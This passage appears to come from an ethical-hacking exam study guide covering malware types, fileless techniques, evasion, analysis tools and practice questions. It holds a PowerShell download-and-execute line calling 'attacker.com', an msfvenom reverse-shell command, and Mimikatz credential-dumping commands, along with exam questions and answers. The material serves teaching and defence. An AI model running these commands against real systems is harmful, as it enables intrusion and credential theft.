Changes its code (specifically its decryption routine) with each infection. The virus body is encrypted, and the decryption stub mutates. The underlying malicious payload remains the same, but the binary signature is different every time.
- Uses a mutation engine to generate different decryption routines
- Defeats signature-based detection (the signature changes with every copy)
- Example: Storm Worm, Virlock

**Metamorphic Virus:**
Completely rewrites its own code with each infection — not just the decryption stub, but the entire virus body. The functionality is preserved, but the code structure, instruction order, register usage, and control flow are different.
- More sophisticated and harder to detect than polymorphic viruses
- Does not need encryption — the entire code changes
- Requires advanced code analysis (behavioral analysis) to detect
- Example: Zmist, Regswap

| Feature | Polymorphic | Metamorphic |
|---------|------------|-------------|
| What changes? | Decryption stub only | Entire virus code |
| Uses encryption? | Yes — payload is encrypted | Not necessarily |
| Detection difficulty | Hard | Harder |
| Technique | Mutation engine for decryptor | Code rewriting, instruction substitution, register reassignment |

**Stealth Virus:**
Hides from antivirus by intercepting system calls. When the AV reads an infected file, the virus intercepts the read request and returns the original, clean version of the file. The virus modifies the file on disk but conceals the modification.
- Hooks OS interrupt handlers (INT 13h for disk access, INT 21h for file operations)
- The infected file appears unchanged to any software that reads it through normal OS channels
- Detected by: booting from clean media and scanning the dormant disk

**Cavity (Space-Filler) Virus:**
Inserts itself into empty spaces (cavities) within a legitimate executable without increasing the file size. Many executables have padding or alignment gaps that the virus exploits.
- Does not change the file size — hard to detect by file size comparison
- Limited by the size of available cavities in the host file
- Example: Lehigh virus

**Boot Sector Virus (Boot Infector):**
Infects the Master Boot Record (MBR) or Volume Boot Record (VBR) of a disk. The virus loads before the operating system, which means it runs before any antivirus software.
- Historically spread through infected floppy disks
- Modern equivalent: bootkits (e.g., TDL4/Alureon)
- Countermeasure: UEFI Secure Boot (verifies the integrity of the bootloader before executing it)

**Macro Virus:**
Written in macro languages (VBA — Visual Basic for Applications) and embedded in documents (Word, Excel, PowerPoint). Executes when the document is opened and macros are enabled.
- Spread through email attachments and shared documents
- Platform-independent (runs wherever the Office suite runs)
- Examples: Melissa (1999), Concept, Emotet (initially distributed via macro-laden documents)
- Countermeasure: Disable macros by default, enable only for trusted documents

**Multipartite Virus:**
Infects both executable files and boot sectors simultaneously. This dual infection vector makes it harder to remove — cleaning the files does not remove the boot sector infection, and vice versa. Both must be cleaned.
- Combines file-infector and boot-infector behaviors
- Examples: Invader, Flip, Tequila

**Encryption Virus:**
Encrypts its payload to avoid signature-based detection. Contains a decryption routine that runs first, decrypts the main virus body in memory, then executes it.
- The decryption routine itself has a fixed signature (unlike polymorphic viruses, which mutate the decryptor)
- Simpler than polymorphic — can be detected by signature-matching the decryption stub

**Additional virus types:**

**Armored Virus:** Uses anti-disassembly and anti-debugging techniques to make reverse engineering difficult. Detects debuggers and sandboxes, and behaves differently when analyzed.

**Tunneling Virus:** Attempts to bypass behavior-based detection by directly accessing low-level OS interrupts, "tunneling" under the antivirus hooks. Instead of making system calls through the normal chain (where the AV has installed hooks), it calls the original, unhooked interrupt handlers.

**Sparse Infector:** Only infects files under certain conditions (e.g., every 10th file executed, files accessed on specific dates, files of a specific size). By infecting infrequently, it avoids detection.

**Companion Virus:** Does not modify existing files. Instead, creates a new file with the same name but a different extension that Windows executes first. For example, creating `notepad.com` in the same directory as `notepad.exe` — Windows executes `.com` files before `.exe` files.

### 3.3 Trojan Types

| Trojan Type | Purpose |
|------------|---------|
| **Remote Access Trojan (RAT)** | Provides the attacker with full remote control (webcam, keylogging, file management, shell). Examples: njRAT, DarkComet, Poison Ivy, QuasarRAT |
| **Backdoor Trojan** | Opens a hidden communication channel for the attacker to connect |
| **Botnet Trojan** | Turns the infected machine into a bot in a botnet, controlled by a C&C (Command and Control) server |
| **Rootkit Trojan** | Hides its presence and other malware on the system |
| **E-Banking Trojan** | Steals banking credentials. Intercepts or modifies banking sessions. Examples: Zeus, SpyEye, Emotet (later versions) |
| **Proxy Trojan** | Turns the infected machine into a proxy server, routing attacker traffic through the victim |
| **Defacement Trojan** | Modifies or destroys data on the system (corrupts files, changes wallpaper) |
| **Service Protocol Trojan** | Exploits specific protocols (FTP, HTTP, SMTP) to provide unauthorized access |
| **Covert Channel Trojan** | Creates a hidden communication channel using protocols that would not normally carry data (ICMP tunneling, DNS tunneling) |

### 3.4 Ransomware

Ransomware encrypts the victim's files and demands payment (typically in cryptocurrency) for the decryption key.

**How ransomware works:**
1. Initial access (phishing email, exploit kit, RDP brute force)
2. Payload executes and contacts C&C server to receive the encryption key
3. Files are encrypted using strong encryption (AES-256 for file encryption, RSA-2048 for key encryption)
4. Ransom note is displayed with payment instructions (Bitcoin wallet address, payment deadline)
5. If the victim pays, the attacker (may) provide the decryption key
6. Some ransomware also exfiltrates data before encrypting (double extortion)

**Notable ransomware families:**
- **WannaCry (2017):** Used the EternalBlue exploit (MS17-010, SMBv1 vulnerability). Spread like a worm — no user interaction required. Affected 200,000+ computers across 150 countries.
- **NotPetya (2017):** Also used EternalBlue. Disguised as ransomware but was actually a wiper (designed to destroy, not for ransom). Targeted Ukraine, caused $10+ billion in damages.
- **Ryuk:** Targeted enterprise environments. Often deployed after initial access via TrickBot or Emotet.
- **REvil (Sodinokibi):** Ransomware-as-a-Service (RaaS). Responsible for the Kaseya supply chain attack (2021).
- **LockBit:** One of the most active RaaS operations. Known for fast encryption speeds.

### 3.5 Fileless Malware

Fileless malware operates entirely in memory and uses legitimate system tools to execute its payload. No malicious files are written to disk, making it extremely difficult for traditional antivirus (which scans files) to detect.

**Techniques:**
- **PowerShell-based:** Downloads and executes code entirely in memory
  ```powershell
  # Example: Download and execute in memory (no file on disk)
  IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
  ```
- **WMI (Windows Management Instrumentation):** Create persistent WMI event subscriptions that execute code when triggered
- **Living off the Land (LOLBins):** Use built-in Windows tools for malicious purposes: `mshta.exe`, `regsvr32.exe`, `certutil.exe`, `rundll32.exe`, `wmic.exe`
- **Macro-initiated:** Office macro downloads and executes payload in memory (no file saved to disk)
- **Registry-resident:** Store encoded payload in the Windows Registry and use a legitimate tool to decode and execute it

**Why fileless malware is dangerous:**
- No files on disk = no file signatures to scan
- Uses trusted, signed system tools (PowerShell, WMI) = hard to block without breaking legitimate functionality
- Lives in memory = disappears on reboot (unless persistence mechanism stores payload in registry/WMI)
- Detection requires: behavioral analysis, memory forensics, EDR (Endpoint Detection and Response) solutions

### 3.6 APT (Advanced Persistent Threat)

An APT is not a single malware type but a coordinated, long-term cyberattack campaign typically conducted by nation-states or organized crime groups targeting specific organizations.

**APT Characteristics (all five must be present):**
1. **Advanced:** Uses custom malware, zero-day exploits, and sophisticated techniques
2. **Persistent:** Maintains long-term access (months to years), not a smash-and-grab
3. **Threat:** Has clear objectives (espionage, intellectual property theft, sabotage)
4. **Targeted:** Focuses on specific organizations, industries, or individuals
5. **Well-funded:** Has significant resources and personnel

**APT Kill Chain (Lockheed Martin Cyber Kill Chain):**
1. Reconnaissance: research the target (OSINT, social media, job postings)
2. Weaponization: create a custom exploit payload (malicious document, trojanized software)
3. Delivery: deliver the weapon (spear phishing email, watering hole, supply chain)
4. Exploitation: execute the exploit on the target's system
5. Installation: install backdoor/RAT for persistence
6. Command & Control (C2): establish communication channel back to attacker
7. Actions on Objectives: accomplish the goal (data exfiltration, sabotage)

**Notable APT Groups:**
- APT28 (Fancy Bear): Russian military intelligence (GRU)
- APT29 (Cozy Bear): Russian SVR intelligence
- APT41 (Double Dragon): Chinese state-sponsored, both espionage and financial crime
- Lazarus Group: North Korean (responsible for Sony hack, WannaCry, cryptocurrency theft)
- Equation Group: NSA-linked (Stuxnet, Flame)

### 3.7 Notable Malware Examples

**Emotet:**
- Originally a banking Trojan (2014), evolved into a malware-as-a-service platform
- Primary delivery: phishing emails with macro-laden Word/Excel attachments
- Acts as a loader/dropper: downloads and installs additional malware (TrickBot, Ryuk ransomware)
- Uses modular architecture: can add capabilities (email harvesting, credential theft, lateral movement)
- Spreads within networks using stolen credentials and SMB exploits
- Takedown by law enforcement in January 2021, but re-emerged in November 2021

**Mirai Botnet:**
- IoT (Internet of Things) botnet discovered in 2016
- Targets IoT devices (routers, cameras, DVRs) with default credentials
- Scans the internet for devices running Telnet with factory-default usernames/passwords
- Once infected, the device becomes a bot that can be used for DDoS attacks
- Responsible for the October 2016 Dyn DNS attack that took down Twitter, Netflix, Reddit, and many other sites
- Source code was publicly released by the author ("Anna-senpai")
- Key lesson: IoT devices with default credentials are a massive attack surface

### 3.8 Malware Analysis

The exam tests two fundamental approaches to malware analysis:

**Static Analysis (examining malware without executing it):**

| Technique | What You Learn | Tools |
|-----------|---------------|-------|
| File fingerprinting (hashing) | Unique identifier; check against known malware databases (VirusTotal) | `md5sum`, `sha256sum`, HashCalc |
| String extraction | Hardcoded URLs, IP addresses, file paths, error messages, encryption keys | `strings` (Linux), BinText, FLOSS |
| File format analysis | File type, PE headers, sections, imports, exports | `file` (Linux), PEiD, PE Explorer, CFF Explorer |
| Packer/obfuscation detection | Is the malware packed (compressed/encrypted) to evade analysis? | PEiD, Detect It Easy (DiE), ExeInfoPE |
| Disassembly | Examine the assembly code without running it | IDA Pro, Ghidra (free, by NSA), Radare2 |
| YARA rules | Pattern matching to classify and identify malware families | YARA |

**Dynamic Analysis (executing malware in a controlled environment and observing behavior):**

| Technique | What You Learn | Tools |
|-----------|---------------|-------|
| Sandboxed execution | What the malware does when it runs (files created, registry changes, processes spawned) | Cuckoo Sandbox, Any.Run, Joe Sandbox, Windows Sandbox |
| Network monitoring | What domains/IPs the malware contacts, what data it exfiltrates | Wireshark, TCPView, Fiddler, FakeNet-NG |
| Process monitoring | What processes the malware creates, what DLLs it loads, what system calls it makes | Process Monitor (ProcMon), Process Explorer (ProcExp), API Monitor |
| Registry monitoring | What registry keys the malware creates or modifies (persistence, configuration) | RegShot, Process Monitor |
| File system monitoring | What files the malware creates, modifies, or deletes | Process Monitor, SysInternals |
| Memory analysis | Extract decrypted payloads, encryption keys, C&C configuration from memory | Volatility, Rekall |
| Debugging | Step through execution instruction by instruction | x64dbg, OllyDbg, WinDbg, GDB |

**Static vs. Dynamic — Key Differences for the Exam:**

| Aspect | Static Analysis | Dynamic Analysis |
|--------|----------------|-----------------|
| **Execution** | Malware is NOT executed | Malware IS executed |
| **Risk** | No risk — nothing runs | Must be done in an isolated environment (sandbox/VM) |
| **What it reveals** | Code structure, strings, imported functions, packing | Actual behavior — network connections, file changes, registry modifications |
| **Limitations** | Cannot reveal runtime behavior; packed/encrypted code is hard to analyze | Malware may detect sandbox and change behavior; time-delayed payloads may not trigger |
| **Speed** | Faster for initial triage | Slower — requires setup of isolated environment |
| **Order** | Always perform static analysis FIRST | Perform dynamic analysis SECOND, after static analysis |

### 3.9 Anti-Malware Evasion Techniques

Attackers use these techniques to prevent their malware from being detected by antivirus and security software:

- **Obfuscation:** Modify the source code to make it harder to understand while preserving functionality (variable renaming, dead code insertion, control flow changes)
- **Packing:** Compress or encrypt the malware binary. The packer wraps the malware in a compressed/encrypted layer with a decompression stub. When executed, the stub unpacks the malware in memory. Common packers: UPX, Themida, VMProtect
- **Crypters:** Encrypt the malware and prepend a decryption stub. When executed, the stub decrypts the malware in memory. "FUD" (Fully Undetectable) crypters are sold on underground forums
- **Code signing:** Sign the malware with a stolen or fraudulently obtained code signing certificate so it appears to be legitimate software
- **Polymorphism:** Change the binary signature with each copy (explained in virus types above)
- **Metamorphism:** Completely rewrite the malware code with each copy (explained above)
- **Anti-sandbox / Anti-VM detection:** Check if the malware is running in a virtual machine or sandbox, and if so, behave benignly. Detection methods include:
  - Check for VM-specific processes (`vmtoolsd.exe`, `vmwaretray.exe`, `VBoxService.exe`)
  - Check for VM-specific registry keys
  - Check for VM-specific hardware (MAC address starting with `00:0C:29` for VMware)
  - Check mouse movement (no real user in a sandbox)
  - Time-based evasion: sleep for 10+ minutes before executing (sandboxes typically have short analysis windows)
- **Timestomping:** Modify file timestamps (creation, modification, access dates) to blend in with legitimate system files
- **Living off the Land:** Use legitimate OS tools instead of custom malware executables (see fileless malware section)

### 3.10 Anti-Malware Countermeasures

**Prevention:**
- Keep operating systems and software up to date (patch management)
- Use enterprise antivirus with real-time protection and automatic updates
- Deploy EDR (Endpoint Detection and Response) solutions for behavioral analysis
- Disable macros by default in Office applications
- Implement application whitelisting (only approved software can execute)
- Use email filtering to block malicious attachments and links
- Implement network segmentation to limit lateral movement
- Block known-bad domains and IP addresses at the firewall/DNS level

**Detection:**
- Signature-based detection: compare file hashes and byte patterns against known malware databases (fast but cannot detect unknown malware)
- Heuristic/behavioral detection: analyze what a program does, not what it looks like (can detect unknown malware but higher false positive rate)
- Sandboxing: execute suspicious files in an isolated environment and observe behavior
- Anomaly-based detection: establish a baseline of normal activity and alert on deviations
- Machine learning: train models on malware characteristics to classify unknown files

---

## Part 4: Exam-Style Practice Questions

**Question 1:**
An attacker has obtained NTLM password hashes from a Windows domain controller. The attacker uses a precomputed table that maps hash values to plaintext passwords. Which type of attack is this?

A. Dictionary attack
B. Brute force attack
C. Rainbow table attack
D. Hybrid attack

**Answer: C.** A rainbow table is a precomputed lookup table that maps hashes to plaintext values. Dictionary attacks try words from a list. Brute force tries every combination. Hybrid combines dictionary words with modifications.

---

**Question 2:**
Which type of rootkit installs itself below the operating system, creates a thin virtualization layer, and pushes the original OS into a virtual machine?

A. User-level rootkit
B. Kernel-level rootkit
C. Bootloader-level rootkit
D. Hypervisor-level rootkit

**Answer: D.** A hypervisor-level (virtual machine based) rootkit creates a virtualization layer between the hardware and the OS. The OS runs as a guest VM, unaware that it is no longer running on bare metal. This makes it extremely difficult to detect from within the OS.

---

**Question 3:**
An attacker has compromised a Windows system and wants to hide a malicious executable behind an innocent text file. The system uses NTFS. Which technique should the attacker use?

A. Steganography
B. Alternate Data Streams (ADS)
C. File extension spoofing
D. Hidden file attribute

**Answer: B.** Alternate Data Streams (ADS) is an NTFS feature that allows multiple data streams to be attached to a single file. The attacker can hide a malicious executable in a named stream of an innocent text file. The file size and attributes appear unchanged in normal directory listings. ADS is specific to NTFS.

---

**Question 4:**
A virus changes its decryption routine with each new infection but keeps the encrypted payload the same. Which type of virus is this?

A. Metamorphic virus
B. Stealth virus
C. Polymorphic virus
D. Multipartite virus

**Answer: C.** A polymorphic virus changes its decryption stub/routine with each infection, producing a different binary signature each time. The encrypted payload remains functionally identical. A metamorphic virus rewrites its entire code (not just the decryptor). A stealth virus hides by intercepting system calls. A multipartite virus infects both files and boot sectors.

---

**Question 5:**
An attacker gains access to a system as a regular user (User A) and then uses the compromised account to access the files of another regular user (User B) without escalating to administrator. What type of privilege escalation is this?

A. Vertical privilege escalation
B. Horizontal privilege escalation
C. Lateral movement
D. Pivoting

**Answer: B.** Horizontal privilege escalation means moving to another account at the same privilege level. The attacker does not gain higher privileges — they gain access to a different user's resources. Vertical escalation would involve gaining administrator/root access. Lateral movement and pivoting are related concepts (moving between systems) but are not the correct terms for this scenario.

---

**Question 6:**
Which Mimikatz command extracts plaintext passwords from the LSASS process memory on a Windows system?

A. `lsadump::sam`
B. `sekurlsa::logonpasswords`
C. `kerberos::golden`
D. `lsadump::dcsync`

**Answer: B.** `sekurlsa::logonpasswords` dumps credentials (including plaintext passwords, NTLM hashes, and Kerberos tickets) from the LSASS process memory. `lsadump::sam` dumps the local SAM database. `kerberos::golden` creates Golden Ticket attacks. `lsadump::dcsync` replicates credentials from a domain controller using the Directory Replication Service (DRS) protocol.

---

**Question 7:**
Which malware operates entirely in memory, uses legitimate system tools like PowerShell and WMI, and does not write malicious files to disk?

A. Polymorphic virus
B. Rootkit
C. Fileless malware
D. Cavity virus

**Answer: C.** Fileless malware resides entirely in memory and leverages legitimate operating system tools (PowerShell, WMI, mshta.exe, certutil.exe) to execute its payload. No malicious files are written to disk, making it invisible to traditional file-based antivirus scanning. Detection requires behavioral analysis or EDR solutions.

---

**Question 8:**
What is the primary reason that password salting defeats rainbow table attacks?

A. Salting increases the length of the password
B. Salting encrypts the password hash
C. Each user has a unique salt, making precomputed tables useless because a separate table would be needed for each salt value
D. Salting adds special characters to the password

**Answer: C.** A salt is a unique random value prepended or appended to each password before hashing. Since every user has a different salt, even identical passwords produce different hashes. An attacker would need a separate rainbow table for every possible salt value, which is computationally infeasible. The salt does not encrypt the hash, and it is not the same as adding characters to the password itself.

---

**Question 9:**
An attacker uses `msfvenom` to generate a reverse TCP payload for a Windows target. Which command correctly generates this payload?

A. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe`
B. `msfvenom -p windows/meterpreter/bind_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe`
C. `msfvenom -e x86/shikata_ga_nai -f exe > shell.exe`
D. `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf`

**Answer: A.** The correct command uses the `windows/meterpreter/reverse_tcp` payload with LHOST (attacker IP) and LPORT (listening port), output format `-f exe` for a Windows executable. Option B uses `bind_tcp` (target listens, attacker connects — not a reverse shell). Option C has no payload specified. Option D is for Linux (ELF format), not Windows.

---

**Question 10:**
The Mirai botnet primarily targets which type of devices?

A. Windows desktop computers
B. macOS laptops
C. IoT devices with default credentials
D. Linux enterprise servers

**Answer: C.** Mirai specifically targets Internet of Things (IoT) devices — routers, IP cameras, DVRs, and other embedded devices — that have factory-default usernames and passwords accessible via Telnet. It does not target desktop computers, laptops, or enterprise servers. The massive Dyn DNS attack in October 2016 was carried out by Mirai-infected IoT devices.

---

## Part 5: Quick Reference — Tool Cheat Sheet

| Tool | Category | Key Use |
|------|----------|---------|
| **Nessus** | Vulnerability Scanner | Commercial scanner; 180,000+ plugins; credentialed and non-credentialed scans |
| **OpenVAS** | Vulnerability Scanner | Open-source alternative to Nessus; part of Greenbone Vulnerability Management |
| **Qualys** | Vulnerability Scanner | Cloud-based vulnerability management platform |
| **John the Ripper** | Password Cracker | Open-source; supports 200+ hash types; single/wordlist/incremental modes |
| **Hashcat** | Password Cracker | GPU-accelerated; fastest password cracker; 350+ hash types |
| **L0phtCrack** | Password Auditor | Windows password auditing; imports hashes from SAM/AD/network |
| **Mimikatz** | Credential Extraction | Extracts plaintext passwords, NTLM hashes, Kerberos tickets from Windows memory |
| **Metasploit** | Exploitation Framework | Exploit development, payload generation (msfvenom), post-exploitation (getsystem) |
| **msfvenom** | Payload Generator | Generates shellcode and payloads in various formats (exe, elf, php, py) |
| **Netcat (nc)** | Network Utility | Reverse/bind shells, port scanning, file transfer, banner grabbing |
| **Cryptcat** | Encrypted Netcat | Same as Netcat but encrypts traffic with Twofish |
| **Cuckoo Sandbox** | Malware Analysis | Automated dynamic malware analysis in isolated VMs |
| **IDA Pro / Ghidra** | Reverse Engineering | Disassemblers for static malware analysis |
| **PEiD** | Packer Detection | Identifies packers, crypters, and compilers used on PE files |
| **Steghide** | Steganography | Hides data in JPEG, BMP, WAV, AU files |
| **Covert_tcp** | Covert Channel | Hides data in TCP/IP packet headers |

---

## Part 6: Key Concepts Summary

1. **CVSS v3.1 ranges:** 0 = None, 0.1-3.9 = Low, 4.0-6.9 = Medium, 7.0-8.9 = High, 9.0-10.0 = Critical
2. **System hacking phases:** Gaining Access -> Escalating Privileges -> Maintaining Access -> Clearing Tracks
3. **Password cracking types:** Dictionary (wordlist), Brute Force (all combinations), Hybrid (dictionary + modifications), Rainbow Table (precomputed lookup), Rule-based (transformation rules)
4. **Salting defeats rainbow tables** because each user's unique salt requires a separate table
5. **Windows passwords:** NTLM hashes are unsalted (vulnerable to rainbow tables); stored in SAM (local) or NTDS.dit (domain)
6. **Linux passwords:** Stored in `/etc/shadow` with salted hashes (SHA-512 by default: `$6$salt$hash`)
7. **Privilege escalation:** Vertical = user to admin; Horizontal = user to different user at same level
8. **Rootkit levels:** User-level (easiest to detect) < Kernel-level < Bootloader-level < Hypervisor-level < Firmware-level (hardest to detect)
9. **ADS (Alternate Data Streams):** NTFS-only feature; hides data in named streams; lost when copied to non-NTFS volumes
10. **Virus types:** Polymorphic (changes decryptor), Metamorphic (rewrites entire code), Stealth (intercepts system calls), Multipartite (files + boot sectors)
11. **Malware analysis:** Static first (no execution, low risk), then Dynamic (execution in sandbox, higher risk)
12. **Fileless malware:** Lives in memory, uses LOLBins (PowerShell, WMI, certutil), no files on disk
13. **Mimikatz key commands:** `sekurlsa::logonpasswords` (dump creds), `lsadump::dcsync` (replicate from DC), `kerberos::golden` (Golden Ticket)
14. **Netcat vs Cryptcat:** Cryptcat adds Twofish encryption; same syntax otherwise
15. **Mirai botnet:** Targets IoT devices with default Telnet credentials; source code publicly released
